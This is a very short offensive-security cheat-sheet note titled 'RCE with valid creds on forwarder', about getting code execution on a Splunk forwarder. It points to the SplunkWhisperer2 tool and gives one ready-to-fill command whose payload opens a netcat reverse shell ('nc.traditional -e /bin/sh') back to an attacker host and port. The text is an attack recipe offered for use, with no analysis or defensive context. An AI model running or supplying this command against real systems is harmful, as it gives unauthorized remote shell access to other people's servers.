# Splunk
## RCE with valid creds on forwarder
Get
`https://github.com/cnotin/SplunkWhisperer2` than do
`python2 PySplunkWhisperer2_remote.py --host XXX --lhost XXX --username XXX --password XXX --payload "nc.traditional -e/bin/sh LHOST LPORT"`